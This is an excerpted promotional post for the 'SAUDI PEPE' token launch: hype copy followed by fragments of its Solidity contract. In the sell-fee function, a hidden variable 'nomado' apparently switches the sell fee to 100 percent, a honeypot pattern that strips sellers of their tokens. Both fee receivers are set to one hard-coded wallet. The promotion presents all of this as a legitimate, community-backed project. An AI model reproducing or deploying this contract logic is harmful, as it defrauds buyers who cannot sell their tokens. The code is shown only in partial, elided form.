...
Token By DEGENS  COMMUNITY lots of whales and strong holders eagerly wait for this Launch ..Fair Launch Soon

The most talked about cryptocurrency in the ETH space . Not only does this project have the HYPE but it has the ecosystem to back it up.  
...
contract SAUDIPEPE is ERC20, Auth {
    ...
    string constant private _name = "SAUDI PEPE";
    ...
    address private autoLiquidityReceiver = 0x4b5D67a72c52e7Ea5fC2D19CF3DfD3D04e9d7EcE;
    address private MarketingFeeReceiver = 0x4b5D67a72c52e7Ea5fC2D19CF3DfD3D04e9d7EcE;
    ...
    function takeSellFee(address sender, uint256 amount) internal returns (uint256){
        ...
        uint256 feeAmount = amount.mul((nomado>0?totalSellFee:100).sub(sellFeeBurn)).div(feeDenominator);
